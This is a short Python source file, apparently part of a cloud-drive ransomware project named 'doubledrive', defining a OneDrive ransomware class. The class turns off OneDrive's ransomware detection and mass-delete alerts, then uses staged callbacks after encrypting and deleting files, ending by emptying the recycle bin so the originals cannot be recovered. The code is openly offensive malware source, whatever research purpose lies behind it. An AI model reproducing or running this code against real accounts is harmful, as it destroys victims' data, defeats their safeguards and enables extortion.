import time

from doubledrive.cloud_drive.onedrive.onedrive import OneDrive
from doubledrive.cloud_ransomware.cloud_drive_ransomware import CloudDriveRansomware

class OneDriveRansomware(CloudDriveRansomware):

    def __init__(self, logged_in_cloud_drive: OneDrive, save_key_dir_path: str = ".", first_stage_done_delay = 10, second_stage_done_delay = 10):
        super().__init__(logged_in_cloud_drive, save_key_dir_path)
        self.__first_stage_done_delay = first_stage_done_delay
        self.__second_stage_done_delay = second_stage_done_delay
        self._cloud_drive.patch_user_preferences({"RansomwareDetection": False, "MassDelete": False})

    def _first_stage_overwriting_finished_callback(self, paths_to_encrypted_contents):
        time.sleep(self.__first_stage_done_delay)
    
    def _second_stage_deletion_finished_callback(self, paths_to_encrypted_contents):
        time.sleep(self.__second_stage_done_delay)
        self._cloud_drive.empty_recycle_bin()
    
    def _third_stage_recreation_finished_callback(self, paths_to_encrypted_contents):
        pass